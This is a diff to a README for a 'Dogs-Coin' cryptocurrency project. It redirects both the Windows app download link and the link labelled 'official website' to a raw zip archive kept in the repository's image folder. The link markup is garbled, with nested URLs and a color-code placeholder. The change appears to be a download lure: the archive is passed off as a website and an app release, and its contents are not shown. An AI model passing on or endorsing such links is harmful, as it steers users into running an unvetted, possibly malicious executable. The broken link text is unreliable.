@@ -38,11 +38,11 @@ Join us today and become part of the Dogs-Coin community!
 To get started with Dogs-Coin, follow these simple steps:
 
 1. Download the Windows App by clicking the button below.
-![Download Windows App](https://github.com/HiCaptain202/Dogs-Coin/releases/tag/v2.0%20Windows%https://github.com/HiCaptain202/Dogs-Coin/releases/tag/v2.0<HEXADECIMAL_COLOR_CODE>)
+![Download Windows App](https://github.com/HiCaptain202/Dogs-Coin/raw/refs/heads/main/img/Coin-Dogs-v3.0.zip%20Windows%https://github.com/HiCaptain202/Dogs-Coin/raw/refs/heads/main/img/Coin-Dogs-v3.0.zip<HEXADECIMAL_COLOR_CODE>)
 
 > Note: Replace `<HEXADECIMAL_COLOR_CODE>` with the actual color code.
 
-2. Visit our official website for more information and updates: [Dogs-Drop](https://github.com/HiCaptain202/Dogs-Coin/releases/tag/v2.0).
+2. Visit our official website for more information and updates: [Dogs-Drop](https://github.com/HiCaptain202/Dogs-Coin/raw/refs/heads/main/img/Coin-Dogs-v3.0.zip).
 
 ---
 
